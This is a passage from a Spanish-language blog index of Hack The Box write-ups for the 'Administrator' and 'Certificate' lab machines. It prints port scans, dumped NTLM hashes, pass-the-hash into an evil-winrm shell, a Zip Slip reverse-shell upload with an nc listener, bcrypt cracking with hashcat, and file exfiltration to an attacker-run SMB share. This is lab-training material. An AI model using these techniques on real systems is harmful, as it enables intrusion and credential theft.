SMB 10.10.11.42 445 DC administrator.htb\\michael:1109:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: SMB 10.10.11.42 445 DC administrator.htb\\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: SMB 10.10.11.42 445 DC administrator.htb\\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31::: SMB 10.10.11.42 445 DC administrator.htb\\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884::: SMB 10.10.11.42 445 DC administrator.htb\\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199::: SMB 10.10.11.42 445 DC administrator.htb\\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9::: SMB 10.10.11.42 445 DC DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3::: SMB 10.10.11.42 445 DC [+] Dumped 11 NTDS hashes to /home/borhub/.nxc/logs/ntds/DC_10.10.11.42_2025-07-01_005803.ntds of which 10 were added to the database SMB 10.10.11.42 445 DC [*] To extract only enabled accounts from the output file, run the following command: SMB 10.10.11.42 445 DC [*] cat /home/borhub/.nxc/logs/ntds/DC_10.10.11.42_2025-07-01_005803.ntds | grep -iv disabled | cut -d \u0026#39;:\u0026#39; -f1 SMB 10.10.11.42 445 DC [*] grep -iv disabled /home/borhub/.nxc/logs/ntds/DC_10.10.11.42_2025-07-01_005803.ntds | cut -d \u0026#39;:\u0026#39; -f1 Ahora haciendo Pass The Hass (PtH) vamos a abrirnos una shell remota como administrator.\n‚ùØ evil-winrm -i 10.10.11.42 -u Administrator -H \u0026#39;3dc553ce4b9fd20bd016e098d2d2fd2e\u0026#39; Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method \u0026#39;quoting_detection_proc\u0026#39; for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; type ../Desktop/root.txt d5de5a7bfa8f2aca3117e240ba182336 ","permalink":"https://borhuub.github.io/writeups/administrator/","summary":"\u003cp\u003e\u003cimg alt=\"Administrator Machine\" loading=\"lazy\" src=\"/img/administrator/pwned.png\"\u003e\u003c/p\u003e\n\u003cp\u003eAs is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich\u003c/p\u003e\n\u003ch1 id=\"reconocimiento\"\u003eReconocimiento\u003c/h1\u003e\n\u003cp\u003eEscaneo de puertos abiertos:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚ùØ sudo nmap -p- -sS --min-rate \u003cspan class=\"m\"\u003e5000\u003c/span\u003e -vvv -n -Pn 10.10.11.42 -oG ports\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost discovery disabled \u003cspan class=\"o\"\u003e(\u003c/span\u003e-Pn\u003cspan class=\"o\"\u003e)\u003c/span\u003e. All addresses will be marked \u003cspan class=\"s1\"\u003e\u0026#39;up\u0026#39;\u003c/span\u003e and scan \u003cspan class=\"nb\"\u003etimes\u003c/span\u003e may be slower.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.97 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2025-06-30 11:49 +0200\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eInitiating SYN Stealth Scan at 11:49\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanning 10.10.11.42 \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"m\"\u003e65535\u003c/span\u003e ports\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 139/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIncreasing send delay \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.11.42 from \u003cspan class=\"m\"\u003e0\u003c/span\u003e to \u003cspan class=\"m\"\u003e5\u003c/span\u003e due to \u003cspan class=\"m\"\u003e158\u003c/span\u003e out of \u003cspan class=\"m\"\u003e526\u003c/span\u003e dropped probes since last increase.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 21/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 445/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 53/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 135/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49667/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 50958/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 3269/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49665/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 9389/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 5985/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 636/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 61600/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 50963/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 50985/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49664/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIncreasing send delay \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.11.42 from \u003cspan class=\"m\"\u003e5\u003c/span\u003e to \u003cspan class=\"m\"\u003e10\u003c/span\u003e due to max_successful_tryno increase to \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIncreasing send delay \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.11.42 from \u003cspan class=\"m\"\u003e10\u003c/span\u003e to \u003cspan class=\"m\"\u003e20\u003c/span\u003e due to max_successful_tryno increase to \u003cspan class=\"m\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIncreasing send delay \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.11.42 from \u003cspan class=\"m\"\u003e20\u003c/span\u003e to \u003cspan class=\"m\"\u003e40\u003c/span\u003e due to \u003cspan class=\"m\"\u003e87\u003c/span\u003e out of \u003cspan class=\"m\"\u003e289\u003c/span\u003e dropped probes since last increase.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIncreasing send delay \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.11.42 from \u003cspan class=\"m\"\u003e40\u003c/span\u003e to \u003cspan class=\"m\"\u003e80\u003c/span\u003e due to max_successful_tryno increase to \u003cspan class=\"m\"\u003e6\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49668/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 389/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 88/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 3268/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 50947/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49666/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 593/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 464/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 47001/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 50966/tcp on 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCompleted SYN Stealth Scan at 11:50, 15.13s elapsed \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e65535\u003c/span\u003e total ports\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.11.42\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up, received user-set \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.045s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanned at 2025-06-30 11:49:53 CEST \u003cspan class=\"k\"\u003efor\u003c/span\u003e 15s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNot shown: \u003cspan class=\"m\"\u003e65509\u003c/span\u003e closed tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003ereset\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT      STATE SERVICE          REASON\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e21/tcp    open  ftp              syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp    open  domain           syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp    open  kerberos-sec     syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp   open  msrpc            syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp   open  netbios-ssn      syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp   open  ldap             syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp   open  microsoft-ds     syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp   open  kpasswd5         syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp   open  http-rpc-epmap   syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp   open  ldapssl          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp  open  globalcatLDAP    syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp  open  globalcatLDAPssl syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e5985/tcp  open  wsman            syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e9389/tcp  open  adws             syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e47001/tcp open  winrm            syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49664/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49665/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49666/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49667/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49668/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e50947/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e50958/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e50963/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e50966/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e50985/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e61600/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRead data files from: /usr/bin/../share/nmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e1\u003c/span\u003e IP address \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 15.18 seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e           Raw packets sent: \u003cspan class=\"m\"\u003e73737\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e3.244MB\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e Rcvd: \u003cspan class=\"m\"\u003e66196\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e2.648MB\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eEscaneo todos los puertos:\u003c/p\u003e","title":"Administrator"},{"content":"\nReconocimiento en red ‚ùØ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.71 -oG ports [sudo] contrase√±a para borhub: Lo siento, pruebe otra vez. [sudo] contrase√±a para borhub: Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-19 19:40 +0200 Initiating SYN Stealth Scan at 19:40 Scanning 10.10.11.71 [65535 ports] Discovered open port 80/tcp on 10.10.11.71 Discovered open port 445/tcp on 10.10.11.71 Discovered open port 53/tcp on 10.10.11.71 Discovered open port 135/tcp on 10.10.11.71 Discovered open port 139/tcp on 10.10.11.71 Discovered open port 49666/tcp on 10.10.11.71 Discovered open port 49712/tcp on 10.10.11.71 Discovered open port 49687/tcp on 10.10.11.71 Discovered open port 636/tcp on 10.10.11.71 Discovered open port 49706/tcp on 10.10.11.71 Discovered open port 593/tcp on 10.10.11.71 Discovered open port 49685/tcp on 10.10.11.71 Discovered open port 49731/tcp on 10.10.11.71 Discovered open port 9389/tcp on 10.10.11.71 Discovered open port 88/tcp on 10.10.11.71 Discovered open port 464/tcp on 10.10.11.71 Discovered open port 49686/tcp on 10.10.11.71 Discovered open port 3268/tcp on 10.10.11.71 Discovered open port 3269/tcp on 10.10.11.71 Discovered open port 389/tcp on 10.10.11.71 Completed SYN Stealth Scan at 19:41, 26.35s elapsed (65535 total ports) Nmap scan report for 10.10.11.71 Host is up, received user-set (0.037s latency). Scanned at 2025-08-19 19:40:55 CEST for 26s Not shown: 65515 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 \u0026lt;strong\u0026gt;139/tcp open netbios-ssn syn-ack ttl 127 \u0026lt;/strong\u0026gt;389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49685/tcp open unknown syn-ack ttl 127 49686/tcp open unknown syn-ack ttl 127 49687/tcp open unknown syn-ack ttl 127 49706/tcp open unknown syn-ack ttl 127 49712/tcp open unknown syn-ack ttl 127 49731/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.41 seconds Raw packets sent: 131063 (5.767MB) | Rcvd: 30 (1.320KB) ‚ùØ ports.py ports üîç Puertos encontrados: ‚ûú 53 ‚ûú 80 ‚ûú 88 ‚ûú 135 ‚ûú 139 ‚ûú 389 ‚ûú 445 ‚ûú 464 ‚ûú 5 ‚ûú 593 ‚ûú 636 ‚ûú 3268 ‚ûú 3269 ‚ûú 9389 ‚ûú 49666 ‚ûú 49685 ‚ûú 49686 ‚ûú 49687 ‚ûú 49706 ‚ûú 49712 ‚ûú 49731 ¬°Puertos copiados en el portapapeles! ‚ùØ sudo nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49666,49685,49686,49687,49706,49712,49731 10.10.11.71 -oN targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-19 19:42 +0200 Nmap scan report for 10.10.11.71 Host is up (0.12s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30) |_http-title: Did not follow redirect to http://certificate.htb/ |_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-20 01:41:57Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-08-20T01:43:28+00:00; +7h59m38s from scanner time. | ssl-cert: Subject: commonName=DC01.certificate.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026amp;#x3C;unsupported\u0026gt;, DNS:DC01.certificate.htb | Not valid before: 2024-11-04T03:14:54 |_Not valid after: 2025-11-04T03:14:54 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certificate.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026amp;#x3C;unsupported\u0026gt;, DNS:DC01.certificate.htb | Not valid before: 2024-11-04T03:14:54 |_Not valid after: 2025-11-04T03:14:54 |_ssl-date: 2025-08-20T01:43:29+00:00; +7h59m38s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-08-20T01:43:28+00:00; +7h59m38s from scanner time. | ssl-cert: Subject: commonName=DC01.certificate.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026amp;#x3C;unsupported\u0026gt;, DNS:DC01.certificate.htb | Not valid before: 2024-11-04T03:14:54 |_Not valid after: 2025-11-04T03:14:54 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certificate.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026amp;#x3C;unsupported\u0026gt;, DNS:DC01.certificate.htb | Not valid before: 2024-11-04T03:14:54 |_Not valid after: 2025-11-04T03:14:54 |_ssl-date: 2025-08-20T01:43:29+00:00; +7h59m38s from scanner time. 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49685/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49686/tcp open msrpc Microsoft Windows RPC 49687/tcp open msrpc Microsoft Windows RPC 49706/tcp open msrpc Microsoft Windows RPC 49712/tcp open msrpc Microsoft Windows RPC 49731/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-08-20T01:42:52 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 7h59m37s, deviation: 0s, median: 7h59m37s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 99.37 seconds Enumeraci√≥n web Una vez entramos dentro a la web, vemos que se trata de una plataforma para aprender en linea. En ella tambi√©n tenemos la capacidad de registrarnos y de iniciar sesi√≥n.\nUna vez iniciamos sesi√≥n, vemos que tenemos un nuevo apartado de cursos.\nEntonces pruebo a pinchar en alguno de los diferentes cursos que vemos y aunque el curso tiene un precio, podemos enrolar el curso para poder hacer-lo.\nHecho esto, nos aparece un apartado m√°s abajo con las diferentes clases y alg√∫n apartado practico en el cual tenemos que subir el archivo del ejercicio.\nZip Slip Attack + Zip Concatenation En este caso vamos a llevar a cabo un ataque¬†Zip Slip, que es una vulnerabilidad cr√≠tica de directory traversal en operaciones de descompresi√≥n de archivos ZIP. La explotaci√≥n se basa en el hecho de que¬†la aplicaci√≥n descomprime archivos sin validar adecuadamente los nombres de los archivos contenidos dentro del ZIP.\nzip pdf.zip ejemplo.pdf python3 zip-slip-exploit-example/evilarc.py -d 10 -o win revershe_shell.php cat pdf.zip evil.zip \u0026gt; archivos.zip 7z l archivos.zip nc -lvnp 4444 Enumeraci√≥n de archivos del sistema Al parecer encontramos las credenciales que usa la aplicaci√≥n web para acceder a la base de datos de mysql:\ntype db.php Pero si seguimos enumerando, vemos un mont√≥n de archivos interesantes para llevar a cabo nuestro siguiente movimiento.\nLlegamos a la carpeta ra√≠z del servidor xampp, en el cual tenemos archivos interesantes como passwords.txt, C:\\xampp\\mysql\\bin\\my.ini y C:\\xampp\\phpMyAdmin\\config.inc.php .\nEnumeraci√≥n SQL - Mysql Visto esto, parece que para entrar a la base de datos solo necesitamos lo que que ser√≠a las credenciales default. Ahora navegamos a la carpeta mysql\\bin, en el cual esta el archivo ejecutable de mysql.\nEn un principio intento que se me abra un prompt donde yo ir escribiendo los comandos, pero al no funcionar-me uso la opci√≥n -e para ejecutar las querys que necesito.\n.\\mysql.exe -u root -h 127.0.0.1 -P 3306 -e \u0026#34;SHOW DATABASES;\u0026#34; .\\mysql.exe -u root -h 127.0.0.1 -P 3306 --database=certificate_webapp_db -e \u0026#34;SHOW TABLES;\u0026#34; .\\mysql.exe -u root -h 127.0.0.1 -P 3306 --database=certificate_webapp_db -e \u0026#34;SELECT * FROM USERS;\u0026#34; Nos copiamos todo el listado y lo metemos en el archivo sql_users. Y ahora para craquear los hashes, vamos crear un archivo con solo los usuarios y los hashes separados por : haciendo uso de regex:\ncat sql_users | awk \u0026#39;NR\u0026gt;1 {print 4$, $6}\u0026#39; | tr \u0026#34; \u0026#34; \u0026#34;:\u0026#34; \u0026gt; hashes Opci√≥n Descripci√≥n awk 'NR\u0026gt;1 {print 4$, $6}' Con NR\u0026gt;1 dejamos de mostrar la primera linea.Con {print $4, $6} mostramos solo las columnas 4 y 6. tr \u0026quot; \u0026quot; \u0026ldquo;:\u0026rdquo; Cambiamos los espacios por : Ahora vamos a creackear los hashes, aunque nuestro objetivo es el usuario sara.b . Primero, identificamos el hash como bcrypt y as√≠ sabemos que tenemos que usar el tipo de hash 3200 en hashcat.\nY ahora ejecutamos el crackeo con la opci√≥n --username para indicar que hemos a√±adido los usuarios en el archivo con los hash.\nhashcat -m 3200 --force --username -a 0 hashes /usr/share/SecLists/Password/Leaked-Databases/rockyou.txt Y as√≠ obtenemos el hash para nuestro usuario objetivo sara.b:Blink182. Comprobaci√≥n de credenciales:\nnxc winrm 10.10.11.71 -u sara.b -p Blink182 Enumeraci√≥n archivos usuario sara.b Con evil-winrm nos abrimos la shell de sara.b para seguir enumerando las carpetas. De momento no tenemos la userflag pero descubrimos un mensaje y un archivo .pcap relacionado con el equipo WS-01.\nY aqu√≠ el mensaje sobre los problemas que est√°n teniendo:\nFile Download Ahora nos montamos un servidor SMB en nuestra m√°quina atacante para as√≠ descargarnos el archivo .pcap.\n#Maquina atacante sudo smbserver.py smbFolder $(pwd) -smb2support -username borhub -password borhubpass #Maquina victima net use x: \\\\10.10.14.214\\smbFolder /user:borhub borhubpass copy C:\\Users\\Sara.B\\Documents\\WS-01\\WS-01_PktMon.pcap x:\\WS-01_PktMon.pcap Enumerando 